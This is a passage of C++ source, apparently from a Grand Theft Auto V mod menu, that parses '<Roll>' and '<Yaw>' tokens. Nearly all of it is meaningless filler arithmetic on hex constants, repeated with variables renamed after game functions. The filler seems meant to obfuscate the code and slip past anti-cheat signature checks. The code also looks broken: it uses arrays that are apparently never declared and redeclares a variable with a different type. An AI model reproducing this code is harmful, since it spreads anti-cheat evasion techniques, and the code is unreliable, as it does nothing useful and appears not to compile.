							matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
							matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
							matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
							matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
							matriz[1] = (0xB1231 * 0xA) + 0xA12;
							a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						}
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
						a = 0.0f;
						b = 0.0f;
						if (matriz[4] > 50.0f)
						{
							matriz[4] = matriz[1];
						}
						a2 = (matriz[4]) / (2 * matriz[2]);
						a1 = (matriz[3] + (2)) / (2 * matriz[2]);
						matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (matriz[3] + (5)) / (2 * matriz[2]);
						aaaaaa = 0xB2 * 2;
						a = 0.0f;
						a1 = (matriz[3] + (4)) / (2 * matriz[2]);
						b = 0.0f;
						matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
						matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
						matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
						matriz[4] = matriz[1];
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
						matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						a2 = (matriz[4] + (2)) / (2 * matriz[2]);
						matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						if (matriz[1] > aaaaaa)
						{
						}
						else
							a1 = (matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (matriz[4] - (3)) / (2 * matriz[2]);

						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
							GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
							a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
						}
						else
						{
							offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
							offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
							offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
							offset = (0xB1231 * 0xA) + 0xA12;
							a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						}
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
						if (GTA5_exe_sig_[4] > 50.0f)
						{
							GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						}
						a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
						a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
						a = 0.0f;
						a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						b = 0.0f;
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
						GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
						offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						offset = (0xB1231 * 0xA) + 0xA12;
						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

						if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
							GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
							a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
						}
						else
						{
							GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
							GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
							GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
							GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
							a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						}
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
						a = 0.0f;
						b = 0.0f;
						if (GTA5_exe_sig_[4] > 50.0f)
						{
							GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						}
						a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
						a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
						a = 0.0f;
						a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						b = 0.0f;
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
						GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
							TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
							a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
						}
						else
						{
							offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
							offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
							offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
							offset = (0xB1231 * 0xA) + 0xA12;
							a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						}
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (5) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
						if (TriggerScriptEvent[4] > 50.0f)
						{
							TriggerScriptEvent[4] = TriggerScriptEvent[1];
						}
						a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
						a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
						a = 0.0f;
						a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						b = 0.0f;
						TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
						TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
						TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
						offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						offset = (0xB1231 * 0xA) + 0xA12;
						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

						if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
							TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
							a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
						}
						else
						{
							TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
							TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
							TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
							TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
							a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						}
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
						a = 0.0f;
						b = 0.0f;
						if (TriggerScriptEvent[4] > 50.0f)
						{
							TriggerScriptEvent[4] = TriggerScriptEvent[1];
						}
						a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
						a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
						a = 0.0f;
						a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						b = 0.0f;
						TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
						TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
						TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						std::string b = a;
						b = Extern_Reader::StringManager::ReplaceWord(b, "<Roll>", "");
						tokens.push_back(b);
					}
					else if (Extern_Reader::StringManager::SeContemTexto(token, "<Yaw>"))
					{

					if (offset > aaaaaa)
					{
						matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
						matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
						matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
					}
					else
					{
						offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
						offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
						offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
						offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
						offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
					}
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
					if (matriz[4] > 50.0f)
					{
						matriz[4] = matriz[1];
					}
					a2 = (matriz[4]) / (2 * matriz[2]);
					a1 = (matriz[3] + (2)) / (2 * matriz[2]);
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (matriz[3] + (5)) / (2 * matriz[2]);
					aaaaaa = ponteiro * 2;
					a = 0.0f;
					a1 = (matriz[3] + (4)) / (2 * matriz[2]);
					b = 0.0f;
					matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
					a2 = (matriz[4] + (3)) / (2 * matriz[2]);
					offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
					matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
					matriz[4] = matriz[1];
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
					a2 = (matriz[4] + (3)) / (2 * matriz[2]);
					a2 = (matriz[4] + (2)) / (2 * matriz[2]);
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
